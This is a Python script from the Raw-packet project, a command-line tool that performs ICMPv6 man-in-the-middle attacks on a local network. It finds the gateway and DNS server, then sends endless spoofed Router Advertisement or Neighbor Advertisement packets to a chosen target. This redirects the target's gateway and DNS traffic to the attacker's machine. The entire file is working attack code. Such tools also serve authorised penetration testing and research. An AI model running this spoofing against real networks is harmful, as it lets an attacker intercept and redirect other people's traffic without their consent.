#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
icmpv6_spoof.py: ICMPv6 NA (Neighbor Advertisement) and NA (Neighbor Advertisement) spoofing
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan
from raw_packet.Scanners.icmpv6_router_search import ICMPv6RouterSearch
from raw_packet.Utils.network import RawICMPv6, RawSend
from argparse import ArgumentParser, RawTextHelpFormatter
from time import sleep
from prettytable import PrettyTable
from typing import Union, Dict, List
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
__script_name__ = 'IPv6 Spoofing (ipv6_spoof)'
# endregion


# region class IPv6Spoof
class IPv6Spoof:

    # region Variables
    _base: Base = Base()
    _utils: Utils = Utils()
    _icmpv6: RawICMPv6 = RawICMPv6()

    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None, 'ipv6-link-address': None}
    _target: Dict[str, Union[None, str]] = {'ipv6-address': None, 'mac-address': None, 'vendor': None}
    _techniques: Dict[int, str] = {1: 'ICMPv6 RA (Router Advertisement) Spoofing',
                                   2: 'ICMPv6 NA (Neighbor Advertisement) Spoofing'}
    _technique_index: Union[None, int] = None
    # endregion

    # region Init
    def __init__(self, network_interface: str) -> None:
        """
        Init
        :param network_interface: Network interface name
        """
        self._your = self._base.get_interface_settings(interface_name=network_interface,
                                                       required_parameters=['mac-address'])
        if self._your['ipv6-link-address'] is None:
            self._your['ipv6-link-address'] = self._base.make_ipv6_link_address(self._your['mac-address'])
        self._raw_send: RawSend = RawSend(network_interface=network_interface)
        self._icmpv6_scan: ICMPv6Scan = ICMPv6Scan(network_interface=network_interface)
        self._icmpv6_router_search: ICMPv6RouterSearch = ICMPv6RouterSearch(network_interface=network_interface)
    # endregion

    # region Start IPv6 Spoofing
    def start(self,
              technique: Union[None, int] = None,
              target_ipv6_address: Union[None, str] = None,
              target_mac_address: Union[None, str] = None,
              gateway_ipv6_address: Union[None, str] = None,
              dns_ipv6_address: Union[None, str] = None,
              dns_domain_search: str = 'domain.local',
              ipv6_prefix: str = 'fde4:8dba:82e1:ffff::/64',
              quiet: bool = False):
        try:
            
            # region Variables
            gateway_mac_address: Union[None, str] = None
            prefix: Union[None, str] = None
            mtu: int = 1500
            router_lifetime: int = 2
            reachable_time: int = 2000
            retrans_timer: int = 2000
            advertisement_interval: int = 2000
            # endregion

            # region Set prefix
            if ipv6_prefix is not None:
                prefix = ipv6_prefix
            # endregion

            # region Set technique
            technique_pretty_table: PrettyTable = PrettyTable([self._base.info_text('Index'),
                                                               self._base.info_text('ICMPv6 MiTM technique')])
            for technique_key in self._techniques.keys():
                technique_pretty_table.add_row([str(technique_key), self._techniques[technique_key]])

            if technique is None:
                self._base.print_info('ICMPv6 MiTM technique list:')
                print(technique_pretty_table)
                print(self._base.c_info + 'Select ICMPv6 MiTM technique index from range (1 - ' +
                      str(len(self._techniques.keys())) + '): ', end='')
                current_technique_index: str = input()
                assert current_technique_index.isdigit(), \
                    'ICMPv6 MiTM technique index is not digit!'
                current_technique_index: int = int(current_technique_index)
                assert not any([current_technique_index < 1, current_technique_index > len(self._techniques.keys())]), \
                    'ICMPv6 MiTM technique index is not within range (1 - ' + str(len(self._techniques.keys())) + ')'
                self._technique_index = current_technique_index

            else:
                assert int(technique) == 1 or int(technique) == 2, \
                    'Bad technique index, technique must be: \n' + str(technique_pretty_table)
                self._technique_index = int(technique)
            # endregion

            # region Check gateway_ipv6_address and dns_ipv6_address

            # region Gateway IPv6 address not Set
            router_advertisement_data: Union[None, Dict[str, Union[int, str]]] = None

            if gateway_ipv6_address is None:
                self._base.print_info('Search IPv6 Gateway and DNS server ....')
                router_advertisement_data: Union[None, Dict[str, Union[int, str]]] = \
                    self._icmpv6_router_search.search(timeout=5, retry=3, exit_on_failure=False)

                # region Find IPv6 router
                if router_advertisement_data is not None:
                    gateway_ipv6_address = router_advertisement_data['router_ipv6_address']
                    gateway_mac_address = router_advertisement_data['router_mac_address']
                    if 'dns-server' in router_advertisement_data.keys():
                        dns_ipv6_address = router_advertisement_data['dns-server']
                    else:
                        dns_ipv6_address = self._your['ipv6-link-address']
                    if 'prefix' in router_advertisement_data.keys():
                        prefix = router_advertisement_data['prefix']
                    else:
                        prefix = ipv6_prefix
                    if 'mtu' in router_advertisement_data.keys():
                        mtu = int(router_advertisement_data['mtu'])
                # endregion

                # region Could not find IPv6 router
                else:
                    gateway_ipv6_address = self._your['ipv6-link-address']
                    gateway_mac_address = self._your['mac-address']
                    prefix = ipv6_prefix
                    dns_ipv6_address = self._your['ipv6-link-address']
                # endregion

            # endregion

            # region Gateway IPv6 address is Set
            if gateway_ipv6_address is not None:
                gateway_ipv6_address = \
                    self._utils.check_ipv6_address(network_interface=self._your['network-interface'],
                                                   ipv6_address=gateway_ipv6_address,
                                                   is_local_ipv6_address=True,
                                                   parameter_name='Gateway IPv6 address',
                                                   check_your_ipv6_address=False)
            # endregion

            # region DNS IPv6 address not Set
            if dns_ipv6_address is None:
                dns_ipv6_address = self._your['ipv6-link-address']
            # endregion

            # region DNS IPv6 address is Set
            if dns_ipv6_address is not None:
                dns_ipv6_address = \
                    self._utils.check_ipv6_address(network_interface=self._your['network-interface'],
                                                   ipv6_address=dns_ipv6_address,
                                                   is_local_ipv6_address=False,
                                                   parameter_name='DNS server IPv6 address',
                                                   check_your_ipv6_address=False)
            # endregion

            # region Print Gateway and DNS server information
            self._base.print_success('Gateway IPv6 address: ', gateway_ipv6_address)
            if gateway_mac_address is not None:
                self._base.print_success('Gateway MAC address: ', gateway_mac_address)
            if router_advertisement_data is not None:
                self._base.print_success('Gateway Vendor: ', router_advertisement_data['vendor'])
            if dns_ipv6_address is not None:
                self._base.print_success('DNS IPv6 address: ', dns_ipv6_address)
            self._base.print_success('IPv6 prefix: ', prefix)
            self._base.print_success('MTU: ', str(mtu))
            self._base.print_success('Router lifetime (s): ', str(router_lifetime))
            self._base.print_success('Reachable time (ms): ', str(reachable_time))
            self._base.print_success('Retrans timer (ms): ', str(retrans_timer))
            # endregion

            # endregion

            # region Set target
            self._target = self._utils.set_ipv6_target(network_interface=self._your['network-interface'],
                                                       target_ipv6_address=target_ipv6_address,
                                                       target_mac_address=target_mac_address,
                                                       exclude_ipv6_addresses=[gateway_ipv6_address])
            # Check target IPv6 and gateway IPv6
            assert self._target['ipv6-address'] != gateway_ipv6_address, \
                'Bad target IPv6 address: ' + self._base.error_text(target_ipv6_address) + \
                '; Target IPv6 address is gateway link local IPv6 address!'

            # Print Target IPv6- and MAC-address
            if not quiet:
                self._base.print_success('Target IPv6 address: ', self._target['ipv6-address'])
                self._base.print_success('Target MAC address: ', self._target['mac-address'])
                if self._target['vendor'] is not None:
                    self._base.print_success('Target vendor: ', self._target['vendor'])
            # endregion

            # region Start spoofing
            self._base.print_info('IPv6 Spoof: ', gateway_ipv6_address + ' -> ' + self._your['mac-address'])
            spoof_packets: List[bytes] = list()

            # region Use RA (Router Advertisement) technique
            if self._technique_index == 1:
                self._base.print_info('Send Router Advertisement packets to: ', 
                                      self._target['ipv6-address'] + ' (' +
                                      self._target['mac-address'] + ')')
                self._base.print_info('Start Router Advertisement spoofing ...')
                spoof_packets.append(
                    self._icmpv6.make_router_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
                                                                  ethernet_dst_mac=self._target['mac-address'],
                                                                  ipv6_src=gateway_ipv6_address,
                                                                  ipv6_dst=self._target['ipv6-address'],
                                                                  dns_address=self._your['ipv6-link-address'],
                                                                  domain_search=dns_domain_search,
                                                                  prefix=prefix,
                                                                  mtu=mtu,
                                                                  src_link_layer_address=self._your['mac-address'],
                                                                  router_lifetime=router_lifetime,
                                                                  reachable_time=reachable_time,
                                                                  retrans_timer=retrans_timer,
                                                                  advertisement_interval=advertisement_interval))
            # endregion

            # region Use NA (Neighbor Advertisement) technique
            if self._technique_index == 2:
                self._base.print_info('Send Neighbor Advertisement packets to: ',
                                      self._target['ipv6-address'] + ' (' +
                                      self._target['mac-address'] + ')')
                self._base.print_info('Start Neighbor Advertisement spoofing ...')
                spoof_packets.append(
                    self._icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
                                                                    ethernet_dst_mac=self._target['mac-address'],
                                                                    ipv6_src=gateway_ipv6_address,
                                                                    ipv6_dst=self._target['ipv6-address'],
                                                                    target_ipv6_address=gateway_ipv6_address))
                if dns_ipv6_address != self._your['ipv6-link-address'] and dns_ipv6_address != gateway_ipv6_address:
                    spoof_packets.append(
                        self._icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
                                                                        ethernet_dst_mac=self._target['mac-address'],
                                                                        ipv6_src=dns_ipv6_address,
                                                                        ipv6_dst=self._target['ipv6-address'],
                                                                        target_ipv6_address=dns_ipv6_address))
            # endregion

            while True:
                for spoof_packet in spoof_packets:
                    self._raw_send.send_packet(spoof_packet)
                    sleep(0.25)
            # endregion

        except KeyboardInterrupt:
            if not quiet:
                self._base.print_info('Exit')
            exit(0)

        except AssertionError as Error:
            if not quiet:
                self._base.print_error(Error.args[0])
            exit(1)
    # endregion

# endregion


# region Main function
def main():

    # region Import Raw-packet classes
    base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Parse script arguments
    parser: ArgumentParser = ArgumentParser(description=base.get_banner(__script_name__),
                                            formatter_class=RawTextHelpFormatter)
    parser.add_argument('-T', '--technique', type=int, default=None,
                        help='Set ICMPv6 MiTM technique (example: 1)' +
                             '\n1. ICMPv6 RA (Router Advertisement) Spoofing' +
                             '\n2. ICMPv6 NA (Neighbor Advertisement) Spoofing')
    parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets')
    parser.add_argument('-t', '--target_ip', help='Set target IPv6 link local address', default=None)
    parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
    parser.add_argument('-g', '--gateway_ip', help='Set gateway IPv6 link local address', default=None)
    parser.add_argument('-p', '--ipv6_prefix', help='Set IPv6 prefix, default="fde4:8dba:82e1:ffff::/64"',
                        default='fde4:8dba:82e1:ffff::/64')
    parser.add_argument('-d', '--dns_ip', help='Set DNS server IPv6 link local address', default=None)
    parser.add_argument('-n', '--dns_domain_search', help='Set DNS domain search; default: "local"', default='local')
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    args = parser.parse_args()
    # endregion

    # region Print banner if argument quiet is not set
    if not args.quiet:
        base.print_banner(__script_name__)
    # endregion

    # region Get your network settings
    current_network_interface: str = \
        base.network_interface_selection(interface_name=args.interface,
                                         message='Please select a network interface for ' +
                                                 __script_name__ + ' from table: ')
    # endregion

    try:
        ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=current_network_interface)
        ipv6_spoof.start(technique=args.technique,
                         target_ipv6_address=args.target_ip,
                         target_mac_address=args.target_mac,
                         gateway_ipv6_address=args.gateway_ip,
                         dns_ipv6_address=args.dns_ip,
                         dns_domain_search=args.dns_domain_search,
                         ipv6_prefix=args.ipv6_prefix,
                         quiet=args.quiet)

    except KeyboardInterrupt:
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)
    # endregion

# endregion


# region Call Main function
if __name__ == "__main__":
    main()
# endregion
